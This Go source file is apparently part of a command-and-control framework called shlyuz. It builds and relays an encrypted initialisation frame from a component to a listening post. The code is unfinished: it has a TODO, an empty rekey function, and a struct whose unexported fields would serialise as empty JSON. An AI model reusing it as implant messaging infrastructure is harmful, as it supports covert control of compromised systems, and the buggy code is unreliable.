package transaction

import (
	"encoding/json"
	"shlyuz/pkg/component"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
	"shlyuz/pkg/transport"
)

type initFrameArgs struct {
	manifest component.ComponentManifest
	ipk      asymmetric.PublicKey
}

func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
	var initFrame instructions.Transaction
	var initArgs initFrameArgs

	initFrame.Cmd = "ii"
	initArgs.manifest = component.Manifest
	argMapping := initFrameArgs{manifest: component.Manifest, ipk: component.InitalKeypair.PubKey}
	argMap, _ := json.Marshal(argMapping)
	initFrame.Arg = argMap
	initFrame.ComponentId = component.Config.Id
	instructionFrame := instructions.CreateInstructionFrame(initFrame)
	return *instructionFrame
}

func writeToChannel(channel chan []byte, data []byte) {
	channel <- data
}

func RelayInitFrame(shlyuzComponent *component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) *component.Component {
	frameMap, _ := json.Marshal(initFrame)
	transmitFrame, frameKeyPair := routine.PrepareSealedFrame(frameMap, shlyuzComponent.CurrentLpPubkey, shlyuzComponent.XorKey, shlyuzComponent.Config.InitSignature)
	shlyuzComponent.CurrentKeypair = frameKeyPair
	// go func(shlyuzComponent *component.Component, frame []byte) {
	// 	shlyuzComponent.CmdChannel <- transmitFrame
	// 	close(shlyuzComponent.CmdChannel)
	// }(&shlyuzComponent, transmitFrame)
	// shlyuzComponent.CmdChannel <- transmitFrame
	go writeToChannel(shlyuzComponent.CmdChannel, transmitFrame)
	// TODO: Do the relaying and retreive the ackFrame
	shlyuzTransport.Send(shlyuzComponent)
	return shlyuzComponent
}

func rekey(frame routine.EncryptedFrame) {

}
